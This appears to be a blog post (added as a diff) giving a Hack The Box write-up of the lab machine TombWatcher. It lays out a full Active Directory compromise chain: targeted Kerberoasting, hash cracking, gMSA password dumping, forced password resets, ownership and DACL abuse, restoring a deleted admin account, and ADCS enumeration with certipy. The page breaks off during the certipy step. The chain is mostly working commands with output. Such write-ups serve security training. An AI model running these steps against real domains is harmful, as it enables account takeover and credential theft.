@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Windows - Medium - TombWatcher - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Windows - Medium - TombWatcher</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1754991550103"
+                  >2025-08-12 11:39</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1755015196266"
+                  >2025-08-12 18:13</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<p>Nmap finds domain tombwatcher.htb</p>
+<div><pre class="hljs"><code><span class="hljs-string">└──╼</span> [<span class="hljs-string">★</span>]<span class="hljs-string">$</span> <span class="hljs-string">nmap</span> <span class="hljs-string">-p-</span> <span class="hljs-string">-A</span> <span class="hljs-number">10.129</span><span class="hljs-number">.232</span><span class="hljs-number">.167</span>
+<span class="hljs-string">PORT</span>      <span class="hljs-string">STATE</span> <span class="hljs-string">SERVICE</span>       <span class="hljs-string">VERSION</span>
+<span class="hljs-number">53</span><span class="hljs-string">/tcp</span>    <span class="hljs-string">open</span>  <span class="hljs-string">domain</span>        <span class="hljs-string">Simple</span> <span class="hljs-string">DNS</span> <span class="hljs-string">Plus</span>
+<span class="hljs-number">80</span><span class="hljs-string">/tcp</span>    <span class="hljs-string">open</span>  <span class="hljs-string">http</span>          <span class="hljs-string">Microsoft</span> <span class="hljs-string">IIS</span> <span class="hljs-string">httpd</span> <span class="hljs-number">10.0</span>
+<span class="hljs-string">|_http-server-header:</span> <span class="hljs-string">Microsoft-IIS/10.0</span>
+<span class="hljs-string">|_http-title:</span> <span class="hljs-string">IIS</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Server</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">http-methods:</span> 
+<span class="hljs-string">|_</span>  <span class="hljs-attr">Potentially risky methods:</span> <span class="hljs-string">TRACE</span>
+<span class="hljs-number">88</span><span class="hljs-string">/tcp</span>    <span class="hljs-string">open</span>  <span class="hljs-string">kerberos-sec</span>  <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Kerberos</span> <span class="hljs-string">(server</span> <span class="hljs-attr">time:</span> <span class="hljs-number">2025-08-12 13:37:36Z</span><span class="hljs-string">)</span>
+<span class="hljs-number">135</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">139</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">netbios-ssn</span>   <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">netbios-ssn</span>
+<span class="hljs-number">389</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">ldap</span>          <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Active</span> <span class="hljs-string">Directory</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">(Domain:</span> <span class="hljs-string">tombwatcher.htb0.,</span> <span class="hljs-attr">Site:</span> <span class="hljs-string">Default-First-Site-Name)</span>
+<span class="hljs-string">|_ssl-date:</span> <span class="hljs-number">2025-08-12T13:39:12+00:00</span><span class="hljs-string">;</span> <span class="hljs-string">+4h00m00s</span> <span class="hljs-string">from</span> <span class="hljs-string">scanner</span> <span class="hljs-string">time.</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">ssl-cert: Subject:</span> <span class="hljs-string">commonName=DC01.tombwatcher.htb</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">Subject Alternative Name: othername:</span> <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1</span><span class="hljs-number">.311</span><span class="hljs-number">.25</span><span class="hljs-number">.1</span><span class="hljs-string">::&lt;unsupported&gt;,</span> <span class="hljs-string">DNS:DC01.tombwatcher.htb</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">Not valid before:</span> <span class="hljs-number">2024-11-16T00:47:59</span>
+<span class="hljs-string">|_Not</span> <span class="hljs-attr">valid after:</span>  <span class="hljs-number">2025-11-16T00:47:59</span>
+<span class="hljs-number">445</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">microsoft-ds?</span>
+<span class="hljs-number">464</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">kpasswd5?</span>
+<span class="hljs-number">593</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">ncacn_http</span>    <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span> <span class="hljs-string">over</span> <span class="hljs-string">HTTP</span> <span class="hljs-number">1.0</span>
+<span class="hljs-number">636</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">ssl/ldap</span>      <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Active</span> <span class="hljs-string">Directory</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">(Domain:</span> <span class="hljs-string">tombwatcher.htb0.,</span> <span class="hljs-attr">Site:</span> <span class="hljs-string">Default-First-Site-Name)</span>
+<span class="hljs-string">|_ssl-date:</span> <span class="hljs-number">2025-08-12T13:39:11+00:00</span><span class="hljs-string">;</span> <span class="hljs-string">+4h00m01s</span> <span class="hljs-string">from</span> <span class="hljs-string">scanner</span> <span class="hljs-string">time.</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">ssl-cert: Subject:</span> <span class="hljs-string">commonName=DC01.tombwatcher.htb</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">Subject Alternative Name: othername:</span> <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1</span><span class="hljs-number">.311</span><span class="hljs-number">.25</span><span class="hljs-number">.1</span><span class="hljs-string">::&lt;unsupported&gt;,</span> <span class="hljs-string">DNS:DC01.tombwatcher.htb</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">Not valid before:</span> <span class="hljs-number">2024-11-16T00:47:59</span>
+<span class="hljs-string">|_Not</span> <span class="hljs-attr">valid after:</span>  <span class="hljs-number">2025-11-16T00:47:59</span>
+<span class="hljs-number">3268</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">ldap</span>          <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Active</span> <span class="hljs-string">Directory</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">(Domain:</span> <span class="hljs-string">tombwatcher.htb0.,</span> <span class="hljs-attr">Site:</span> <span class="hljs-string">Default-First-Site-Name)</span>
+<span class="hljs-string">|_ssl-date:</span> <span class="hljs-number">2025-08-12T13:39:12+00:00</span><span class="hljs-string">;</span> <span class="hljs-string">+4h00m00s</span> <span class="hljs-string">from</span> <span class="hljs-string">scanner</span> <span class="hljs-string">time.</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">ssl-cert: Subject:</span> <span class="hljs-string">commonName=DC01.tombwatcher.htb</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">Subject Alternative Name: othername:</span> <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1</span><span class="hljs-number">.311</span><span class="hljs-number">.25</span><span class="hljs-number">.1</span><span class="hljs-string">::&lt;unsupported&gt;,</span> <span class="hljs-string">DNS:DC01.tombwatcher.htb</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">Not valid before:</span> <span class="hljs-number">2024-11-16T00:47:59</span>
+<span class="hljs-string">|_Not</span> <span class="hljs-attr">valid after:</span>  <span class="hljs-number">2025-11-16T00:47:59</span>
+<span class="hljs-number">3269</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">ssl/ldap</span>      <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Active</span> <span class="hljs-string">Directory</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">(Domain:</span> <span class="hljs-string">tombwatcher.htb0.,</span> <span class="hljs-attr">Site:</span> <span class="hljs-string">Default-First-Site-Name)</span>
+<span class="hljs-string">|_ssl-date:</span> <span class="hljs-number">2025-08-12T13:39:11+00:00</span><span class="hljs-string">;</span> <span class="hljs-string">+4h00m01s</span> <span class="hljs-string">from</span> <span class="hljs-string">scanner</span> <span class="hljs-string">time.</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">ssl-cert: Subject:</span> <span class="hljs-string">commonName=DC01.tombwatcher.htb</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">Subject Alternative Name: othername:</span> <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1</span><span class="hljs-number">.311</span><span class="hljs-number">.25</span><span class="hljs-number">.1</span><span class="hljs-string">::&lt;unsupported&gt;,</span> <span class="hljs-string">DNS:DC01.tombwatcher.htb</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">Not valid before:</span> <span class="hljs-number">2024-11-16T00:47:59</span>
+<span class="hljs-string">|_Not</span> <span class="hljs-attr">valid after:</span>  <span class="hljs-number">2025-11-16T00:47:59</span>
+<span class="hljs-number">5985</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">http</span>          <span class="hljs-string">Microsoft</span> <span class="hljs-string">HTTPAPI</span> <span class="hljs-string">httpd</span> <span class="hljs-number">2.0</span> <span class="hljs-string">(SSDP/UPnP)</span>
+<span class="hljs-string">|_http-server-header:</span> <span class="hljs-string">Microsoft-HTTPAPI/2.0</span>
+<span class="hljs-string">|_http-title:</span> <span class="hljs-string">Not</span> <span class="hljs-string">Found</span>
+<span class="hljs-number">9389</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">mc-nmf</span>        <span class="hljs-string">.NET</span> <span class="hljs-string">Message</span> <span class="hljs-string">Framing</span>
+<span class="hljs-number">49667</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">49669</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">ncacn_http</span>    <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span> <span class="hljs-string">over</span> <span class="hljs-string">HTTP</span> <span class="hljs-number">1.0</span>
+<span class="hljs-number">49670</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">49674</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">49692</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">49707</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">49722</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span></code></pre></div>
+<p>We can locate high value targets as henry.</p>
+<p><code>bloodhound-python -u 'john' -p 'Password1'  -d tombwatcher.htb -ns 10.129.232.167 -c All --zip</code></p>
+<p><img src="/_resources/66c3823f23784a7082f2055452b2fa5e.png" /></p>
+<p>We can set the time and then get the hash for alfred.</p>
+<div><pre class="hljs"><code>┌─<span class="hljs-selector-attr">[eu-dedivip-1]</span>─<span class="hljs-selector-attr">[10.10.14.49]</span>─<span class="hljs-selector-attr">[abno525@htb-4k1brha7vc]</span>─<span class="hljs-selector-attr">[~/my_data]</span>
+└──╼ <span class="hljs-selector-attr">[★]</span>$ sudo ntpdate <span class="hljs-number">10.129</span>.<span class="hljs-number">232.167</span>
+<span class="hljs-number">2025</span>-<span class="hljs-number">08</span>-<span class="hljs-number">12</span> <span class="hljs-number">08</span>:<span class="hljs-number">50</span>:<span class="hljs-number">39.47608</span> (-<span class="hljs-number">0500</span>) +<span class="hljs-number">14400.343076</span> +/- <span class="hljs-number">0.039869</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">232.167</span> s1 no-leap
+CLOCK: <span class="hljs-selector-tag">time</span> stepped by <span class="hljs-number">14400.343076</span>
+┌─<span class="hljs-selector-attr">[eu-dedivip-1]</span>─<span class="hljs-selector-attr">[10.10.14.49]</span>─<span class="hljs-selector-attr">[abno525@htb-4k1brha7vc]</span>─<span class="hljs-selector-attr">[~/my_data]</span>
+└──╼ <span class="hljs-selector-attr">[★]</span>$ python3 targetedKerberoast<span class="hljs-selector-class">.py</span> -v -d <span class="hljs-string">'tombwatcher.htb'</span> -u <span class="hljs-string">'henry'</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">'H3nry_987TGV!'</span> 
+<span class="hljs-selector-attr">[*]</span> Starting kerberoast attacks
+<span class="hljs-selector-attr">[*]</span> Fetching usernames from Active Directory with LDAP
+<span class="hljs-selector-attr">[VERBOSE]</span> SPN added successfully <span class="hljs-keyword">for</span> (Alfred)
+<span class="hljs-selector-attr">[+]</span> Printing hash <span class="hljs-keyword">for</span> (Alfred)
+<span class="hljs-variable">$krb5tgs</span>$<span class="hljs-number">23</span>$*Alfred<span class="hljs-variable">$TOMBWATCHER</span>.HTB<span class="hljs-variable">$tombwatcher</span>.htb/Alfred*<span class="hljs-variable">$d5679e52a</span>&lt;snip&gt;<span class="hljs-number">4</span>d84c73d9097a844933a388857bb3b4a08d379262d954f76be21157b669b4018f53b76f04d7633580a4
+<span class="hljs-selector-attr">[VERBOSE]</span> SPN removed successfully <span class="hljs-keyword">for</span> (Alfred)</code></pre></div>
+<p>We can then crack the hash with john.</p>
+<div><pre class="hljs"><code>└──╼ [★]$ sudo john ./hash_alfred 
+<span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">encoding</span>: UTF<span class="hljs-number">-8</span>
+Loaded <span class="hljs-number">1</span> <span class="hljs-keyword">password</span> hash (krb5tgs, Kerberos <span class="hljs-number">5</span> TGS etype <span class="hljs-number">23</span> [MD4 HMAC-MD5 RC4])
+Will run <span class="hljs-number">4</span> OpenMP threads
+Proceeding <span class="hljs-keyword">with</span> single, rules:Single
+Press Ctrl-C <span class="hljs-keyword">to</span> <span class="hljs-keyword">abort</span>, <span class="hljs-keyword">or</span> send SIGUSR1 <span class="hljs-keyword">to</span> john process <span class="hljs-keyword">for</span> status
+Almost done: Processing the remaining buffered candidate passwords, <span class="hljs-keyword">if</span> <span class="hljs-keyword">any</span>.
+Proceeding <span class="hljs-keyword">with</span> wordlist:/usr/<span class="hljs-keyword">share</span>/john/<span class="hljs-keyword">password</span>.lst
+basketball       (?)     
+<span class="hljs-number">1</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> DONE <span class="hljs-number">2</span>/<span class="hljs-number">3</span> (<span class="hljs-number">2025</span><span class="hljs-number">-08</span><span class="hljs-number">-12</span> <span class="hljs-number">08</span>:<span class="hljs-number">54</span>) <span class="hljs-number">50.00</span>g/s <span class="hljs-number">51200</span>p/s <span class="hljs-number">51200</span>c/s <span class="hljs-number">51200</span>C/s <span class="hljs-number">123456.</span>.random
+Use the "--show" <span class="hljs-keyword">option</span> <span class="hljs-keyword">to</span> display <span class="hljs-keyword">all</span> <span class="hljs-keyword">of</span> the cracked passwords reliably
+<span class="hljs-keyword">Session</span> completed. </code></pre></div>
+<p>We can add ourselves to the infra group.</p>
+<p><img src="/_resources/69b71702babb49698e887b9c20416107.png" /></p>
+<p>┌─[eu-dedivip-1]─[10.10.14.49]─[abno525@htb-4k1brha7vc]─[~/my_data]<br />
+└──╼ [★]$ bloodyAD --host ‘10.129.232.167’ -d ‘tombwatcher.htb’ -u alfred -p ‘basketball’ add groupMember INFRASTRUCTURE alfred<br />
+[+] alfred added to INFRASTRUCTURE</p>
+<p>Then we takeover ansible_dev.</p>
+<p><img src="/_resources/6fd7b75e2de7467bbf2ad3fdd43a9f04.png" /></p>
+<div><pre class="hljs"><code>└──╼ [★]<span class="hljs-variable">$ </span>python3 gMSADumper.py -u <span class="hljs-string">'alfred'</span> -p <span class="hljs-string">'basketball'</span> -d <span class="hljs-string">'tombwatcher.htb'</span>
+Users <span class="hljs-keyword">or</span> groups who can read password <span class="hljs-keyword">for</span> ansible_dev<span class="hljs-variable">$:</span>
+ &gt; Infrastructure
+ansible_dev<span class="hljs-variable">$:</span>::<span class="hljs-number">7</span>bc5a56af89da4d3c03bc048055350f2
+ansible_dev<span class="hljs-variable">$:</span>aes256-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span>a7e3cc3aaad2b30beca182a9707f1a1e71d2eb49a557d50f9fd91360ec2f64
+ansible_dev<span class="hljs-variable">$:</span>aes128-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:de6c86d8b6a71c4538f82dc570f7f9a6</span></code></pre></div>
+<p>Then we takeover sam by changing his password.</p>
+<p><img src="/_resources/d5933a689575487ea86158c14b6f0ad9.png" /></p>
+<div><pre class="hljs"><code>└──╼ [★]<span class="hljs-symbol">$</span> bloodyAD --host <span class="hljs-string">'10.129.232.167'</span> -d <span class="hljs-string">'tombwatcher.htb'</span> -u <span class="hljs-string">'ansible_dev$'</span> -p <span class="hljs-string">":7bc5a56af89da4d3c03bc048055350f2"</span> <span class="hljs-keyword">set</span> password <span class="hljs-comment">SAM</span> <span class="hljs-comment">"Password1"</span>
+[+] Password <span class="hljs-comment">changed successfully!</span></code></pre></div>
+<p>Finally we abuse WriteOwner to get to John.</p>
+<p><img src="/_resources/2c2db3aec172492cbea1fbd6419b707e.png" /></p>
+<div><pre class="hljs"><code>└──╼ [★]$ owneredit.py -action <span class="hljs-keyword">write</span> -<span class="hljs-built_in">new</span>-<span class="hljs-keyword">owner</span> <span class="hljs-string">'sam'</span> -target <span class="hljs-string">'john'</span> <span class="hljs-string">'tombwatcher.htb/sam:Password1'</span>
+Impacket v0<span class="hljs-number">.13</span><span class="hljs-number">.0</span>.dev0+<span class="hljs-number">20250130.104306</span><span class="hljs-number">.0</span>f4b866 - Copyright Fortra, LLC <span class="hljs-keyword">and</span> its affiliated companies 
+
+[*] <span class="hljs-keyword">Current</span> <span class="hljs-keyword">owner</span> information below
+[*] - SID: S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-1392491010</span><span class="hljs-number">-1358638721</span><span class="hljs-number">-2126982587</span><span class="hljs-number">-512</span>
+[*] - sAMAccountName: <span class="hljs-keyword">Domain</span> Admins
+[*] - distinguishedName: CN=<span class="hljs-keyword">Domain</span> Admins,CN=Users,DC=tombwatcher,DC=htb
+[*] OwnerSid modified successfully!</code></pre></div>
+<p>We took over john but have only genericWrite, so we have to modify our privs. Then we can reset the password and get in using evilwinrm.</p>
+<div><pre class="hljs"><code>┌─<span class="hljs-selector-attr">[eu-dedivip-1]</span>─<span class="hljs-selector-attr">[10.10.14.49]</span>─<span class="hljs-selector-attr">[abno525@htb-4k1brha7vc]</span>─<span class="hljs-selector-attr">[~/my_data]</span>
+└──╼ <span class="hljs-selector-attr">[★]</span>$ bloodyAD <span class="hljs-attr">--host</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">232.167</span> -d tombwatcher<span class="hljs-selector-class">.htb</span> -u sam -<span class="hljs-selector-tag">p</span> <span class="hljs-string">'Password1'</span> add genericAll john sam
+<span class="hljs-selector-attr">[+]</span> sam has now GenericAll on john
+┌─<span class="hljs-selector-attr">[eu-dedivip-1]</span>─<span class="hljs-selector-attr">[10.10.14.49]</span>─<span class="hljs-selector-attr">[abno525@htb-4k1brha7vc]</span>─<span class="hljs-selector-attr">[~/my_data]</span>
+└──╼ <span class="hljs-selector-attr">[★]</span>$ bloodyAD <span class="hljs-attr">--host</span> <span class="hljs-string">'10.129.232.167'</span> -d <span class="hljs-string">'tombwatcher.htb'</span> -u <span class="hljs-string">'sam'</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">"Password1"</span> set password JOHN <span class="hljs-string">"Password1"</span>
+<span class="hljs-selector-attr">[+]</span> Password changed successfully!</code></pre></div>
+<p><img src="/_resources/fb2e571d104d4357b5ac334804c0d971.png" /></p>
+<p>Looking at “Outbound object control” we see that we can takeover ADCS.</p>
+<p><img src="/_resources/d95c943619b54964a46d973da51a30c5.png" /></p>
+<div><pre class="hljs"><code>└──╼ <span class="hljs-selector-attr">[★]</span>$ dacledit<span class="hljs-selector-class">.py</span> -action <span class="hljs-string">'write'</span> -rights <span class="hljs-string">'FullControl'</span> -inheritance -principal <span class="hljs-string">'john'</span> -target-dn <span class="hljs-string">'OU=ADCS,DC=TOMBWATCHER,DC=HTB'</span> <span class="hljs-string">'tombwatcher.htb'</span>/<span class="hljs-string">'john'</span>:<span class="hljs-string">'Password1'</span>
+Impacket v0.<span class="hljs-number">13.0</span>.dev0+<span class="hljs-number">20250130.104306</span>.<span class="hljs-number">0</span>f4b866 - Copyright Fortra, LLC and its affiliated companies 
+
+<span class="hljs-selector-attr">[*]</span> NB: objects with adminCount=<span class="hljs-number">1</span> will no <span class="hljs-attribute">inherit</span> ACEs from their parent container/OU
+<span class="hljs-selector-attr">[*]</span> DACL backed up to dacledit-<span class="hljs-number">20250812</span>-<span class="hljs-number">101707</span><span class="hljs-selector-class">.bak</span>
+<span class="hljs-selector-attr">[*]</span> DACL modified successfully!</code></pre></div>
+<p>Knowing the name of the box, we can now check tombstones on the server and find cert_admin accounts. We can reanimate the newest one.</p>
+<div><pre class="hljs"><code><span class="hljs-string">*Evil-WinRM*</span> <span class="hljs-string">PS</span> <span class="hljs-string">C:\Users\john\Documents&gt;</span> <span class="hljs-string">Get-ADObject</span> <span class="hljs-string">-Filter</span> <span class="hljs-string">'isDeleted -eq $true'</span> <span class="hljs-string">-IncludeDeletedObjects</span> <span class="hljs-string">-Properties</span> <span class="hljs-string">*</span>
+<span class="hljs-string">&lt;snip&gt;</span>
+<span class="hljs-attr">CN                              :</span> <span class="hljs-string">cert_admin</span>
+                                  <span class="hljs-string">DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf</span>
+<span class="hljs-attr">codePage                        :</span> <span class="hljs-number">0</span>
+<span class="hljs-attr">countryCode                     :</span> <span class="hljs-number">0</span>
+<span class="hljs-attr">Created                         :</span> <span class="hljs-number">11</span><span class="hljs-string">/16/2024</span> <span class="hljs-number">12</span><span class="hljs-string">:07:04</span> <span class="hljs-string">PM</span>
+<span class="hljs-attr">createTimeStamp                 :</span> <span class="hljs-number">11</span><span class="hljs-string">/16/2024</span> <span class="hljs-number">12</span><span class="hljs-string">:07:04</span> <span class="hljs-string">PM</span>
+<span class="hljs-attr">Deleted                         :</span> <span class="hljs-literal">True</span>
+<span class="hljs-attr">Description                     :</span>
+<span class="hljs-attr">DisplayName                     :</span>
+<span class="hljs-attr">DistinguishedName               :</span> <span class="hljs-string">CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted</span> <span class="hljs-string">Objects,DC=tombwatcher,DC=htb</span>
+<span class="hljs-attr">dSCorePropagationData           :</span> {<span class="hljs-number">11</span><span class="hljs-string">/16/2024</span> <span class="hljs-number">12</span><span class="hljs-string">:07:10</span> <span class="hljs-string">PM</span>, <span class="hljs-number">11</span><span class="hljs-string">/16/2024</span> <span class="hljs-number">12</span><span class="hljs-string">:07:08</span> <span class="hljs-string">PM</span>, <span class="hljs-number">12</span><span class="hljs-string">/31/1600</span> <span class="hljs-number">7</span><span class="hljs-string">:00:00</span> <span class="hljs-string">PM</span>}
+<span class="hljs-attr">givenName                       :</span> <span class="hljs-string">cert_admin</span>
+<span class="hljs-attr">instanceType                    :</span> <span class="hljs-number">4</span>
+<span class="hljs-attr">isDeleted                       :</span> <span class="hljs-literal">True</span>
+<span class="hljs-attr">LastKnownParent                 :</span> <span class="hljs-string">OU=ADCS,DC=tombwatcher,DC=htb</span>
+<span class="hljs-attr">lastLogoff                      :</span> <span class="hljs-number">0</span>
+<span class="hljs-attr">lastLogon                       :</span> <span class="hljs-number">0</span>
+<span class="hljs-attr">logonCount                      :</span> <span class="hljs-number">0</span>
+<span class="hljs-attr">Modified                        :</span> <span class="hljs-number">11</span><span class="hljs-string">/16/2024</span> <span class="hljs-number">12</span><span class="hljs-string">:07:27</span> <span class="hljs-string">PM</span>
+<span class="hljs-attr">modifyTimeStamp                 :</span> <span class="hljs-number">11</span><span class="hljs-string">/16/2024</span> <span class="hljs-number">12</span><span class="hljs-string">:07:27</span> <span class="hljs-string">PM</span>
+<span class="hljs-attr">msDS-LastKnownRDN               :</span> <span class="hljs-string">cert_admin</span>
+<span class="hljs-attr">Name                            :</span> <span class="hljs-string">cert_admin</span>
+                                  <span class="hljs-string">DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf</span>
+<span class="hljs-attr">nTSecurityDescriptor            :</span> <span class="hljs-string">System.DirectoryServices.ActiveDirectorySecurity</span>
+<span class="hljs-attr">ObjectCategory                  :</span>
+<span class="hljs-attr">ObjectClass                     :</span> <span class="hljs-string">user</span>
+<span class="hljs-attr">ObjectGUID                      :</span> <span class="hljs-string">938182c3-bf0b-410a-9aaa-45c8e1a02ebf</span>
+<span class="hljs-attr">objectSid                       :</span> <span class="hljs-string">S-1-5-21-1392491010-1358638721-2126982587-1111</span>
+<span class="hljs-attr">primaryGroupID                  :</span> <span class="hljs-number">513</span>
+<span class="hljs-attr">ProtectedFromAccidentalDeletion :</span> <span class="hljs-literal">False</span>
+<span class="hljs-attr">pwdLastSet                      :</span> <span class="hljs-number">133762504248946345</span>
+<span class="hljs-attr">sAMAccountName                  :</span> <span class="hljs-string">cert_admin</span>
+<span class="hljs-attr">sDRightsEffective               :</span> <span class="hljs-number">7</span>
+<span class="hljs-attr">sn                              :</span> <span class="hljs-string">cert_admin</span>
+<span class="hljs-attr">userAccountControl              :</span> <span class="hljs-number">66048</span>
+<span class="hljs-attr">uSNChanged                      :</span> <span class="hljs-number">13197</span>
+<span class="hljs-attr">uSNCreated                      :</span> <span class="hljs-number">13186</span>
+<span class="hljs-attr">whenChanged                     :</span> <span class="hljs-number">11</span><span class="hljs-string">/16/2024</span> <span class="hljs-number">12</span><span class="hljs-string">:07:27</span> <span class="hljs-string">PM</span>
+<span class="hljs-attr">whenCreated                     :</span> <span class="hljs-number">11</span><span class="hljs-string">/16/2024</span> <span class="hljs-number">12</span><span class="hljs-string">:07:04</span> <span class="hljs-string">PM</span>
+
+
+<span class="hljs-string">Restore-ADObject</span> <span class="hljs-string">-Identity</span> <span class="hljs-string">938182c3-bf0b-410a-9aaa-45c8e1a02ebf</span>
+<span class="hljs-string">Enable-ADAccount</span> <span class="hljs-string">-Identity</span> <span class="hljs-string">cert_admin</span></code></pre></div>
+<p>We have genericAll over this new user, so time to reset his password with <code>Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "Password1" -AsPlainText -Force)</code>.</p>
+<p><img src="/_resources/23642354335a412a9a3ad05904cfca37.png" /></p>
+<p>Now that we have cert_admin, time to look at certs that he menages.</p>
+<div><pre class="hljs"><code>└──╼ [★]$ certipy-ad <span class="hljs-built_in">find</span> -u cert_admin@tombwatcher.htb -p Password1 -dc-ip 10.129.232.167
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Trying <span class="hljs-keyword">to</span> <span class="hljs-built_in">get</span> CA configuration <span class="hljs-keyword">for</span> <span class="hljs-string">'tombwatcher-CA-1'</span> via CSRA
+[!] Got <span class="hljs-built_in">error</span> <span class="hljs-keyword">while</span> trying <span class="hljs-keyword">to</span> <span class="hljs-built_in">get</span> CA configuration <span class="hljs-keyword">for</span> <span class="hljs-string">'tombwatcher-CA-1'</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying <span class="hljs-keyword">to</span> <span class="hljs-built_in">get</span> CA configuration <span class="hljs-keyword">for</span> <span class="hljs-string">'tombwatcher-CA-1'</span> via RRP
